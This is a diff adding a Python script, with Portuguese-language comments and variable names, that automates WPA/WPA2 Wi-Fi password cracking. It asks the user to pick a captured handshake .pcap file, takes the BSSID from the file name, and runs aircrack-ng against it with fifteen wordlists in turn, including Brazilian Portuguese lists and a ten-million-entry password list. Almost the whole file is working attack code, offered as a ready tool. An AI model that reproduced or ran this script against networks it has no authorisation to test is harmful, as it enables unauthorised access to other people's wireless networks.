@@ -1,0 +1,70 @@
+#!/usr/bin/python3
+import os
+import time
+import sys
+import subprocess
+r = "\033[0;49;91m"                                                  
+g = "\033[0;49;92m"
+y = "\033[0;49;93m"
+b = "\033[0;49;94m"                                                  
+p = "\033[0;49;95m"
+b2 = "\033[0;49;96m"
+d = "\033[2;37m"
+w = "\033[0m"
+os.system("clear")
+class Cores:
+    def cc1(msg):
+        aviso = print(f"[{y}!{w}] {y}WARNING : {w}{msg}")
+    def cc2(msg):
+        erro_crítico = print(f"[{p}!!{w}]{r} FATAL ERROR : {r}{msg}")
+    def cc3(msg):
+        info = print(f"[{y}i{w}] INFO : {w}{msg}")
+    def cc4(msg):    
+        sucesso = print(f"[{g}:){w}]{g} SUCESS : {w}{msg}")
+def execmy(command):
+    executar = subprocess.run(command, shell=True, capture_output=True, text=True, check=True)
+    print(executar.stdout)
+def execcmd(comando):
+    result = subprocess.run(['whoami'], capture_output=True, text=True, check=True)
+    usuario = result.stdout.strip()
+    try:
+        # Executa o comando e captura a saída
+        #Cores.cc3(f"EXECUTING {comando[0]} {comando[1]} {comando[2]} {comando[3]}")
+        time.sleep(2)
+        resultado = subprocess.run(comando, shell=True, capture_output=True, text=True, check=True)
+        tam = len(resultado.stdout.splitlines())
+        if tam >= 2:
+            lista = resultado.stdout.splitlines()
+            tm = len(lista)
+            for i in range(tm):
+                print(f"{g}{i} - {r}{lista[i]}\033[m")
+            Cores.cc3(f"Choose a number between 0-{tm-1}")
+            resp = int(input(f"{y}choooose>\033[0m "))
+            arquivo_pcap = lista[resp]
+            hs = arquivo_pcap.find("HS_")
+            pcap_refinado = arquivo_pcap[hs+3:]
+            pcap_refinado_ultra = pcap_refinado[:12]
+            bssid = pcap_refinado_ultra
+            cmdexec = ["cwlist.txt", "0xc0da-ptbr.txt", "7776palavras.txt", "best1050.txt", "first-name-pt-br.txt", "wlist.txt", "biblic-words-pt-br.txt", "br-wordlist", "brazilian-soccer-teams.txt", "brwlist.txt", "passphrases.txt", "10-million-password-list-top-10000000.txt", "numeros.txt", "wifite", "senhas.txt"]
+            for z in range(15, 0, -1):
+                os.system("clear")
+                Cores.cc3(f"[{g}USER{w}] : {y}{usuario}{w}")
+                Cores.cc3(f"[{g}MAC-ADDRESS{w}] : {y}{bssid}{w}")
+                Cores.cc3(f"[{g}FILE{w}] : {y}{arquivo_pcap}{w}")
+                print("")
+                Cores.cc1(f"Initializing {r}Brute{b}Force{w} in {y}{z}")
+                time.sleep(1)
+            for item in cmdexec:
+                os.system("clear")
+                Cores.cc3(f"Trying Break WPA/WPA2 Handshake of {y}{arquivo_pcap}{w} with {r}{item}{w}")
+                time.sleep(5)
+                execmy(f"aircrack-ng -w /home/{usuario}/wpafalls/{item} -b {bssid} {arquivo_pcap}")
+                for i in range(90,0,-1):
+                    Cores.cc3(f"Waiting {g}{i}{w} seconds for the next attempt...")
+                    time.sleep(1)
+        else:
+            pass
+    except subprocess.CalledProcessError as e:
+        Cores.cc3(comando)
+        Cores.cc2(e.stderr)
+execcmd("ls *.pcap")
